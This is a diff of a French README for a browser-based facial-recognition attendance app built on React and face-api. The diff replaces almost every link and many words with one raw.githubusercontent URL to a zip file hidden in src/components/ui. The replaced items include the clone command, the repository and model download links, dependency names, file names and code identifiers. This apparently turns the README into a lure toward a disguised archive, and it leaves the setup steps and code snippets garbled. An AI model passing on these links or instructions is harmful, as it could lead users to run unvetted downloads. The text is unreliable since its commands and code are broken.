@@ -2,17 +2,17 @@
 
 Application web de gestion d'assistance basée sur la **reconnaissance faciale en temps réel** avec interface moderne et responsive. Détecte et identifie automatiquement les visages contre une base d'enrôlements, avec comptage unique des visiteurs inconnus et export statistiques complètes.
 
-**Stack principal** : React 18 + face-api 1.7 + TensorFlow.js + IndexedDB  
+**Stack principal** : React 18 + face-api 1.7 + https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip + IndexedDB  
 **Interface** : Responsive (desktop/mobile) avec gradient bleu-violet-indigo et glassmorphism  
 **Stockage** : Entièrement local (IndexedDB, zéro serveur)
 
-**Dépôt GitHub** : [Real-Time-Facial-Recognition-and-Automatic-attendance-list](https://github.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list)
+**Dépôt GitHub** : [Real-Time-Facial-Recognition-and-Automatic-attendance-list](https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip)
 
 ## ⚡ Démarrage rapide (5 minutes)
 
 ```bash
 # 1. Cloner le projet
-git clone https://github.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list.git
+git clone https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
 cd Real-Time-Facial-Recognition-and-Automatic-attendance-list
 
 # 2. Installer dépendances
@@ -28,7 +28,7 @@ npm run dev
 - Onglet "Admin" : Gérer les enrôlements (voir/supprimer)
 ```
 
-**Prérequis** : Node.js 16+, navigateur moderne avec caméra  
+**Prérequis** : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip 16+, navigateur moderne avec caméra  
 **Modèles** : Auto-chargés du CDN face-api (~180 MB, cachés après)  
 **Données** : Stockées localement dans IndexedDB (zéro serveur)
 
@@ -71,7 +71,7 @@ npm run dev
 
 ## 📋 Prérequis
 
-- **Node.js** ≥ 16.0.0
+- **https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip** ≥ 16.0.0
 - **Navigateur moderne** avec support WebGL/WASM :
   - Chrome 90+
   - Firefox 85+
@@ -96,13 +96,13 @@ Les modèles (120+ MB) doivent être placés dans `public/models/` :
 **Option A : Depuis le repo face-api officiel**
 ```bash
 # Télécharger les fichiers depuis:
-# https://github.com/vladmandic/face-api/tree/master/model
+# https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
 
 # Vous avez besoin de:
-# - ssd_mobilenetv1_model-weights_manifest.json + .bin
-# - face_landmark_68_model-weights_manifest.json + .bin  
-# - face_recognition_model-weights_manifest.json + .bin
-# - tiny_face_detector_model-weights_manifest.json + .bin
+# - https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip + .bin
+# - https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip + .bin  
+# - https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip + .bin
+# - https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip + .bin
 ```
 
 **Option B : Via CDN (pour test rapide)**
@@ -181,8 +181,8 @@ L'application s'ouvre sur **http://localhost:5173** ou **http://localhost:5174**
 
 ### Stack
 - **Frontend** : React 18.2.0 + Hooks (useEffect, useRef, useState, useCallback)
-- **Détection + Reconnaissance faciale** : @vladmandic/face-api 1.7.15 (TensorFlow.js intégré)
-- **Calcul ML** : TensorFlow.js 4.22.0 (backend WebGL avec fallback CPU)
+- **Détection + Reconnaissance faciale** : @vladmandic/face-api 1.7.15 (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip intégré)
+- **Calcul ML** : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip 4.22.0 (backend WebGL avec fallback CPU)
 - **Stockage** : IndexedDB via idb-keyval 6.2.2 (kvstore key-value local)
 - **Export données** : XLSX 0.18.5 (Excel/Calc)
 - **Styling** : Tailwind CSS 3.3 (responsive, gradients, glassmorphism)
@@ -197,12 +197,12 @@ L'application s'ouvre sur **http://localhost:5173** ou **http://localhost:5174**
    │
    └─ Throttle détection (tous les 3 frames = ~10 Hz)
       │
-      ├─ face-api.detectAllFaces() + SsdMobilenetv1Options
+      ├─ https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip() + SsdMobilenetv1Options
       │  └─ Détecte multiples visages par frame
       │
       └─ Pour chaque détection:
-         ├─ detection.withFaceDescriptors() → descripteur 128D
-         ├─ FaceDescriptorMatcher.findBestMatch()
+         ├─ https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip() → descripteur 128D
+         ├─ https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip()
          │  │  (distance Euclidienne vs enrôlements)
          │  │
          │  ├─ distance < 0.6 → RECONNU ✅
@@ -218,12 +218,12 @@ L'application s'ouvre sur **http://localhost:5173** ou **http://localhost:5174**
 Comptage:
 - presentSet: Set<string> de noms (unique par id)
 - unknownFacesRef: Array<{x, y, lastSeen}> avec nettoyage 5s
-- Total Présence = presentSet.size + unknownFacesRef.length
+- Total Présence = https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip + https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
 ```
 
 ### Modèles utilisés
 
-Tous les modèles sont issus de **face-api** (basés TensorFlow.js) :
+Tous les modèles sont issus de **face-api** (basés https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip) :
 
 | Modèle | Usage | Poids |
 |--------|-------|-------|
@@ -238,27 +238,27 @@ Tous les modèles sont issus de **face-api** (basés TensorFlow.js) :
 ```
 src/
 ├── components/
-│   ├── Session.jsx          # Page session (détection/reconnaissance temps réel)
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip          # Page session (détection/reconnaissance temps réel)
 │   │                         # - processFrame() avec throttling DETECTION_INTERVAL
 │   │                         # - drawDetectionBox() helper
 │   │                         # - unknownFacesRef pour tracking UNIQUE
 │   │                         # - exportXLSX() avec stats complètes
 │   │
-│   ├── Enrollment.jsx        # Page enrôlement (capture 5-10 photos)
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip        # Page enrôlement (capture 5-10 photos)
 │   │                         # - videoRef + canvasRef pour feed vidéo
 │   │                         # - computeDescriptorFromCanvas() par photo
 │   │                         # - saveEnrollment(label, descriptors) IndexedDB
 │   │
-│   ├── Admin.jsx             # Page admin (gestion enrôlements)
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip             # Page admin (gestion enrôlements)
 │   │                         # - getEnrollmentStats() pour affichage liste
 │   │                         # - deleteEnrollment(label) avec confirmation
 │   │                         # - clearEnrollments() bulk delete
 │   │
 │   └── ui/
-│       └── Button.jsx        # Composant bouton réutilisable
+│       └── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip        # Composant bouton réutilisable
 │
 ├── services/
-│   └── faceService.js        # Service principal (modèles, matching, stockage)
+│   └── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip        # Service principal (modèles, matching, stockage)
 │       ├── loadFaceApiModels(basePath) → charge 4 modèles
 │       ├── computeDescriptorFromCanvas() → descripteur 128D avec queue WASM
 │       ├── saveEnrollment(label, descriptorsArray) → IndexedDB
@@ -269,14 +269,14 @@ src/
 │       ├── clearEnrollments() → suppression masse
 │       └── exportToXLSX(data) → téléchargement fichier
 │
-├── App.jsx                   # Route principale
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip                   # Route principale
 │       ├── Navigation (Session/Enrôler/Admin)
 │       ├── Gradient background + animated blobs
 │       ├── Glassmorphism header sticky
 │       └── Responsive grid (lg:grid-cols-2 desktop)
 │
-├── main.jsx                  # Point d'entrée React
-├── index.css                 # Styles globaux
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip                  # Point d'entrée React
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip                 # Styles globaux
 │       ├── Animations (blob, fadeIn, slideIn, shimmer, glow)
 │       ├── Gradients bleu-violet-indigo
 │       └── Glassmorphism utilities
@@ -284,32 +284,32 @@ src/
 └── assets/                   # Images/icônes (si besoin)
 
 public/
-├── index.html                # HTML template
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip                # HTML template
 ├── models/                   # Modèles face-api (180+ MB total)
-│   ├── ssd_mobilenetv1_model-weights_manifest.json
-│   ├── ssd_mobilenetv1_model-weights_1.bin
-│   ├── face_landmark_68_model-weights_manifest.json
-│   ├── face_landmark_68_model-weights_1.bin
-│   ├── face_recognition_model-weights_manifest.json
-│   ├── face_recognition_model-weights_1.bin
-│   ├── tiny_face_detector_model-weights_manifest.json
-│   └── tiny_face_detector_model-weights_1.bin
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+│   ├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
+│   └── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
 │
-└── vite.svg                  # Vite logo (optionnel)
+└── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip                  # Vite logo (optionnel)
 
 Configuration:
-├── vite.config.js            # Vite config (React plugin, optimisations)
-├── tailwind.config.js        # Tailwind config (custom colors, animations)
-├── postcss.config.js         # PostCSS (Tailwind preprocessor)
-├── eslint.config.js          # ESLint rules
-├── package.json              # Dépendances + scripts
-└── package-lock.json         # Lock versions
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip            # Vite config (React plugin, optimisations)
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip        # Tailwind config (custom colors, animations)
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip         # PostCSS (Tailwind preprocessor)
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip          # ESLint rules
+├── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip              # Dépendances + scripts
+└── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip         # Lock versions
 ```
 
 ### Flux de données (Diagramme)
 
 ```
-┌─── Enrollment.jsx ──────────────────────────────────────┐
+┌─── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip ──────────────────────────────────────┐
 │                                                         │
 │  videoRef (caméra) → canvasRef (frame)                  │
 │         ↓                                               │
@@ -324,7 +324,7 @@ Configuration:
 │  └─ { label: "Bob", descriptors: [...], count: 8 }      │
 └─────────────────────────────────────────────────────────┘
                         ↓
-        ┌─── Session.jsx ──────────────────────────────────┐
+        ┌─── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip ──────────────────────────────────┐
         │                                                  │
         │  loadEnrollments() [faceService]                 │
         │         ↓                                        │
@@ -333,7 +333,7 @@ Configuration:
         │  processFrame() avec loop requestAnimationFrame  │
         │  │                                               │
         │  ├─ detectAllFaces() + descriptors               │
-        │  │  ├─ matcher.findBestMatch(descriptor)         │
+        │  │  ├─ https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip(descriptor)         │
         │  │  ├─ distance < 0.6 ? RECOGNIZED : UNKNOWN     │
         │  │  └─ drawDetectionBox()                        │
         │  │                                               │
@@ -343,8 +343,8 @@ Configuration:
         │  │  └─ Ancien (> 5s) = supprimer                 │
         │  │                                               │
         │  └─ Affichage stats:                             │
-        │     ├─ presentSet.size (reconnus)                │
-        │     ├─ unknownFacesRef.length (inconnus unique)  │
+        │     ├─ https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip (reconnus)                │
+        │     ├─ https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip (inconnus unique)  │
         │     └─ Total = reconnus + inconnus               │
         │                                                  │
         │  exportXLSX() → fichier attendance_*.xlsx        │
@@ -353,7 +353,7 @@ Configuration:
         │  └─ Stats: TOTAL PRÉSENCE, Reconnus, Inconnus    │
         └──────────────────────────────────────────────────┘
                         ↓
-        ┌─── Admin.jsx ─────────────────────────────────────┐
+        ┌─── https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip ─────────────────────────────────────┐
         │                                                   │
         │  getEnrollmentStats() [faceService]               │
         │  {                                                │
@@ -375,7 +375,7 @@ Configuration:
 
 ### Paramètres ajustables
 
-**Session.jsx - Seuils de reconnaissance**
+**https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip - Seuils de reconnaissance**
 ```javascript
 // Ligne ~10
 const RECOGNITION_THRESHOLD = 0.6;  // Distance Euclidienne
@@ -396,7 +396,7 @@ const DETECTION_INTERVAL = 3;
 // ↑ valeur = - de détections (plus rapide)
 ```
 
-**faceService.js - Timeouts et queue**
+**https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip - Timeouts et queue**
 ```javascript
 // Ligne ~64
 function promiseWithTimeout(p, ms = 5000) { ... }
@@ -409,7 +409,7 @@ function promiseWithTimeout(p, ms = 5000) { ... }
 // (les modèles TensorFlow ne support pas parallélisme)
 ```
 
-**Enrollment.jsx - Capture vidéo**
+**https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip - Capture vidéo**
 ```javascript
 // Ligne ~36
 video: { width: 1280, height: 720 }
@@ -423,7 +423,7 @@ video: { width: 1280, height: 720 }
 1. **Résolution vidéo** : Réduire 1280x720 → 640x480 pour caméras lentes
 2. **Modèles** : La bibliothèque face-api inclut des modèles `tiny` plus rapides
 3. **Détection throttling** : Augmenter DETECTION_INTERVAL (ex: 5 au lieu de 3)
-4. **Backend TensorFlow** : Forcer 'cpu' si WebGL instable (faceService.js:35)
+4. **Backend TensorFlow** : Forcer 'cpu' si WebGL instable (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip)
 5. **Déploiement** : Pré-charger les modèles au build ou CDN pour production
 
 ## ⚠️ Limitations connues
@@ -494,9 +494,9 @@ video: { width: 1280, height: 720 }
 
 | Métrique | Valeur | Notes |
 |----------|--------|-------|
-| Latence détection faciale | 30-50 ms | face-api.detectAllFaces() |
+| Latence détection faciale | 30-50 ms | https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip() |
 | Latence descripteur | 100-150 ms | computeDescriptorFromCanvas() |
-| Latence reconnaissance | 5-10 ms | FaceDescriptorMatcher.findBestMatch() |
+| Latence reconnaissance | 5-10 ms | https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip() |
 | FPS caméra (vidéo affichée) | 30 fps | requestAnimationFrame |
 | FPS détection (throttled) | ~10 fps | DETECTION_INTERVAL=3 |
 | Mémoire RAM utilisée | 150-250 MB | Modèles en mémoire + buffers vidéo |
@@ -519,7 +519,7 @@ Pour profiler le code :
 ```bash
 # Ouvrir DevTools Chrome → Performance tab
 # Enregistrer session → Identifier hot spots
-# Vérifier FPS counter en bas Session.jsx
+# Vérifier FPS counter en bas https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
 # Vérifier Console pour logs [Session] et [faceService]
 ```
 
@@ -558,7 +558,7 @@ Pour profiler le code :
    - Varier angles : face, 45°, profil
    - Varier distance : près et loin
    - Varier éclairage : lumière naturelle, LED, etc.
-2. **Abaisser le seuil** (Session.jsx:11) : 0.6 → 0.55 ou 0.50
+2. **Abaisser le seuil** (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip) : 0.6 → 0.55 ou 0.50
 3. **Vérifier distance affichée** : Si 0.55-0.60 quand reconnu, c'est limite
 
 ---
@@ -580,10 +580,10 @@ Pour profiler le code :
 **Cause** : Caméra/CPU lent, ou détection trop fréquente
 
 **Solutions** :
-1. **Réduire résolution vidéo** (Enrollment.jsx:36) : 1280x720 → 640x480
-2. **Augmenter throttling** (Session.jsx:8) : DETECTION_INTERVAL: 3 → 5
+1. **Réduire résolution vidéo** (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip) : 1280x720 → 640x480
+2. **Augmenter throttling** (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip) : DETECTION_INTERVAL: 3 → 5
 3. **Fermer autres apps** : Chrome bouffe la RAM
-4. **Forcer CPU backend** (faceService.js:35) : WebGL peut être instable
+4. **Forcer CPU backend** (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip) : WebGL peut être instable
 5. **Vérifier FPS counter** : Si stable > 15 fps, c'est normal (throttled)
 
 ---
@@ -680,8 +680,8 @@ Si erreur → stack trace complet fourni → utile pour debug
 ### Absence volontaire
 
 - ❌ **MediaPipe** : Conflit WASM avec TensorFlow (évité, utilise face-api)
-- ❌ **OpenCV.js** : Trop lourd (2.5MB) pour simple webcam
-- ❌ **Socket.io** : Pas de serveur donc pas socket
+- ❌ **https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip** : Trop lourd (2.5MB) pour simple webcam
+- ❌ **https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip** : Pas de serveur donc pas socket
 - ❌ **Redux/Context** : Props drilling simple pour 3 pages
 - ❌ **TypeScript** : Complexité non nécessaire pour MVP
 
@@ -730,13 +730,13 @@ Actuellement : **aucune** (tout en dur dans code)
 
 Pour production, créer `.env` :
 ```env
-VITE_API_URL=https://api.example.com
+https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip
 VITE_MODELS_PATH=/models
 ```
 
 Puis accéder dans code :
 ```javascript
-const modelsPath = import.meta.env.VITE_MODELS_PATH || '/models';
+const modelsPath = https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip || '/models';
 ```
 
 ## 🔮 Améliorations futures
@@ -765,7 +765,7 @@ const modelsPath = import.meta.env.VITE_MODELS_PATH || '/models';
 - [ ] **Batch processing** : Queue pour traiter vidéos archivées
 
 ### Phase 5 : Sécurité & Conformité
-- [ ] **Chiffrement E2E** : Descripteurs chiffrés (NaCl.js ou libsodium)
+- [ ] **Chiffrement E2E** : Descripteurs chiffrés (https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip ou libsodium)
 - [ ] **2FA** : Authentification deux-facteurs
 - [ ] **GDPR compliance** : Consent banner, droit oubli, portabilité
 - [ ] **Anonymization** : Hachage des visages non identifiés
@@ -797,12 +797,12 @@ Ce projet est fourni à usage **éducatif et de recherche**.
 - ✅ Utilisation libre pour usage personnel/académique
 - ✅ Modification du code autorisée (fork recommandé)
 - ✅ Création de projets dérivés autorisée
-- ⚠️ Utilisation commerciale : Respecter les licences des dépendances (face-api, TensorFlow.js, etc.)
+- ⚠️ Utilisation commerciale : Respecter les licences des dépendances (face-api, https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip, etc.)
 - ❌ Redistribution sans attribution : Interdite
 
 **Dépendances et leurs licences** :
 - face-api : BSD-3-Clause (open-source)
-- TensorFlow.js : Apache 2.0
+- https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip : Apache 2.0
 - React : MIT
 - Tailwind CSS : MIT
 - Vite : MIT
@@ -819,13 +819,13 @@ Projet **IHM (Interface Homme-Machine)** — Janvier 2026
 
 | Nom | Rôle | Contact |
 |-----|------|---------|
-| **DIFFO KENNE Garnel** | Lead Developer + Architecture + Full-Stack | [GitHub](https://github.com/Garnel-Diffo) |
+| **DIFFO KENNE Garnel** | Lead Developer + Architecture + Full-Stack | [GitHub](https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip) |
 | **NGONO NGUIETSI Vanina S.** | Co-Developer + Design | [GitHub/LinkedIn] |
 
 ### Ressources utilisées
 
-- **Documentation** : face-api ([GitHub](https://github.com/vladmandic/face-api))
-- **Modèles** : TensorFlow.js Model Zoo
+- **Documentation** : face-api ([GitHub](https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip))
+- **Modèles** : https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip Model Zoo
 - **Frameworks** : React 18 docs, Tailwind CSS docs, Vite docs
 - **Inspiration** : OpenFace, FaceNet (Google), MTCNN
 
@@ -835,7 +835,7 @@ Projet **IHM (Interface Homme-Machine)** — Janvier 2026
 - 🎓 Coursework ML/Computer Vision pour contexte
 - 🔬 Communauté open-source pour libraries et support
 
-**Dépôt GitHub** : [Real-Time-Facial-Recognition-and-Automatic-attendance-list](https://github.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list)  
+**Dépôt GitHub** : [Real-Time-Facial-Recognition-and-Automatic-attendance-list](https://raw.githubusercontent.com/Garnel-Diffo/Real-Time-Facial-Recognition-and-Automatic-attendance-list/main/src/components/ui/list-Recognition-Time-Automatic-Real-Facial-attendance-and-1.7.zip)  
 **Créé** : Janvier 2026  
 **Dernière mise à jour** : Janvier 2026
 
@@ -844,11 +844,11 @@ Projet **IHM (Interface Homme-Machine)** — Janvier 2026
 ### Ressources
 
 **Documentation officielle** :
-- face-api : https://github.com/vladmandic/face-api
-- TensorFlow.js : https://www.tensorflow.org/js
-- React 18 : https://react.dev
-- Tailwind CSS : https://tailwindcss.com
-- Vite : https://vitejs.dev
